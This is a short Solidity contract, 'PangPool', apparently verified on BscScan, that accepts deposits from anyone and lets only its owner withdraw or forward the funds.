/**
 *Submitted for verification at BscScan.com on 2022-03-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.5.16;

contract PangPool {
  address payable public owner;

  constructor() payable public {
    owner = address(uint160(msg.sender));
  }

  function deposit() public payable {}

  function withdraw() public {
    require(owner == msg.sender, "Not Admin Address");
    uint amount = address(this).balance;
    owner.transfer(amount);
  }

  function transfer(address payable _to) public payable {
    require(owner == msg.sender, "Not Admin Address");
    _to.transfer(msg.value);
  }

  function balances() public view returns(uint256) {
    uint amount = address(this).balance;

    return amount;
  }
}